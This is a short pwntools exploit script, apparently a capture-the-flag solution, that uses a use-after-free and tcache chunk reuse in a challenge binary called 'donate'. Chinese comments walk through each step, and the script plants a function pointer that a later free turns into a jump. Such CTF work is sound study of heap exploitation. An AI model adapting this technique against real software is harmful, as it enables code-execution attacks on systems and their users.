from pwn import *

p = process("./donate")
# p = remote('ctf.adl.tw', 10004)

context.arch = 'amd64'

magic_func = 0x4013a9

'''
add donate 兩次 會有四個 chunk
'''
p.sendlineafter(b'option > ', str(1))
p.sendlineafter(b'input index(1~3) > ', str(0))
p.sendlineafter(b'input size of your name > ', str(8))
p.sendlineafter(b'input your name > ', b'aaaaaa')

p.sendlineafter(b'option > ', str(1))
p.sendlineafter(b'input index(1~3) > ', str(1))
p.sendlineafter(b'input size of your name > ', str(8))
p.sendlineafter(b'input your name > ', b'aaaaaa')

'''
free 兩次, 進入到 Tcache
'''
p.sendlineafter(b'option > ', str(2))
p.sendlineafter(b'input index(1~3) > ', str(1))

p.sendlineafter(b'option > ', str(2))
p.sendlineafter(b'input index(1~3) > ', str(0))

'''
要一個0x30的chunk, 所以Tcache會把第一塊0x20拿掉
'''
p.sendlineafter(b'option > ', str(1))
p.sendlineafter(b'input index(1~3) > ', str(2))
p.sendlineafter(b'input size of your name > ', str(32))
p.sendlineafter(b'input your name > ', b'aaaaaaaaaaaaaaaa')

'''
要一個0x20的chunk, 把magic_func寫進去
'''
p.sendlineafter(b'option > ', str(1))
p.sendlineafter(b'input index(1~3) > ', str(3))
p.sendlineafter(b'input size of your name > ', str(12))
p.sendlineafter(b'input your name > ', p64(magic_func))

'''
呼叫free, return到magic_func
'''
p.sendlineafter(b'option > ', str(2))
p.sendlineafter(b'input index(1~3) > ', str(1))

p.interactive()
